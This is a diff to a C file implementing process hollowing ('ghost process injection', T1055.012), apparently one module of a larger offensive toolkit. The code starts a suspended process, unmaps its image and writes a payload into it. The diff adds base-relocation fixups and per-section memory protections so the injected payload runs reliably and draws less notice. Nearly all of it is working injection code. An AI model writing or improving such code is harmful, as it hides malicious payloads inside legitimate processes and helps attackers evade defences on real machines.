@@ -1,8 +1,4 @@
-// src/injection.c
-// Mod 130: Ghost process injection (T1055.012)
-// Creates a suspended process, unmaps its image, writes payload,
-// resumes execution from payload entry point
-#include <windows.h>
+
 #include <stdio.h>
 
 // NtUnmapViewOfSection typedef — resolved dynamically
@@ -64,12 +60,12 @@ BOOL ghost_inject(LPCSTR targetExe, PBYTE payload, DWORD payloadSize) {
     // 5. Allocate memory at preferred base in target process
     PVOID pRemoteBase = VirtualAllocEx(pi.hProcess, preferredBase,
                                        imageSize, MEM_COMMIT | MEM_RESERVE,
-                                       PAGE_EXECUTE_READWRITE);
+                                       PAGE_READWRITE);
     if (!pRemoteBase) {
         // Try any address if preferred is taken
         pRemoteBase = VirtualAllocEx(pi.hProcess, NULL, imageSize,
                                      MEM_COMMIT | MEM_RESERVE,
-                                     PAGE_EXECUTE_READWRITE);
+                                     PAGE_READWRITE);
     }
     if (!pRemoteBase) {
         printf("[!] ghost_inject: VirtualAllocEx failed: %ld\n",
@@ -92,7 +88,72 @@ BOOL ghost_inject(LPCSTR targetExe, PBYTE payload, DWORD payloadSize) {
                            payload + pSection[i].PointerToRawData,
                            pSection[i].SizeOfRawData, NULL);
     }
+    // 7.5. Apply base relocations if we didn't get preferred base
+    if (pRemoteBase != preferredBase) {
+      DWORD relocRva =
+          pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
+              .VirtualAddress;
+      DWORD relocSize =
+          pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
+              .Size;
 
+      if (relocRva && relocSize) {
+        DWORD_PTR delta = (DWORD_PTR)pRemoteBase - (DWORD_PTR)preferredBase;
+        PIMAGE_BASE_RELOCATION pReloc =
+            (PIMAGE_BASE_RELOCATION)(payload + relocRva);
+        PBYTE relocEnd = (PBYTE)pReloc + relocSize;
+
+        while ((PBYTE)pReloc < relocEnd && pReloc->SizeOfBlock) {
+          DWORD entryCount =
+              (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) /
+              sizeof(WORD);
+          PWORD entries =
+              (PWORD)((PBYTE)pReloc + sizeof(IMAGE_BASE_RELOCATION));
+
+          for (DWORD j = 0; j < entryCount; j++) {
+            WORD type = entries[j] >> 12;
+            WORD offset = entries[j] & 0x0FFF;
+            DWORD_PTR fixAddr = pReloc->VirtualAddress + offset;
+
+            if (type == IMAGE_REL_BASED_DIR64) {
+              DWORD_PTR val = 0;
+              ReadProcessMemory(pi.hProcess, (PBYTE)pRemoteBase + fixAddr, &val,
+                                sizeof(val), NULL);
+              val += delta;
+              WriteProcessMemory(pi.hProcess, (PBYTE)pRemoteBase + fixAddr,
+                                 &val, sizeof(val), NULL);
+            } else if (type == IMAGE_REL_BASED_HIGHLOW) {
+              DWORD val32 = 0;
+              ReadProcessMemory(pi.hProcess, (PBYTE)pRemoteBase + fixAddr,
+                                &val32, sizeof(val32), NULL);
+              val32 += (DWORD)delta;
+              WriteProcessMemory(pi.hProcess, (PBYTE)pRemoteBase + fixAddr,
+                                 &val32, sizeof(val32), NULL);
+            }
+          }
+          pReloc =
+              (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc->SizeOfBlock);
+        }
+        printf("[+] ghost_inject: Relocations applied\n");
+      }
+    }
+    // 7.6. Set correct per-section memory permissions
+    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
+      DWORD protect = PAGE_READONLY;
+      DWORD chars = pSection[i].Characteristics;
+
+      if (chars & IMAGE_SCN_MEM_EXECUTE) {
+        protect = (chars & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE
+                                                : PAGE_EXECUTE_READ;
+      } else if (chars & IMAGE_SCN_MEM_WRITE) {
+        protect = PAGE_READWRITE;
+      }
+
+      DWORD oldProt = 0;
+      VirtualProtectEx(pi.hProcess,
+                       (PBYTE)pRemoteBase + pSection[i].VirtualAddress,
+                       pSection[i].Misc.VirtualSize, protect, &oldProt);
+    }
     // 8. Update PEB->ImageBaseAddress
 #ifdef _WIN64
     WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10),
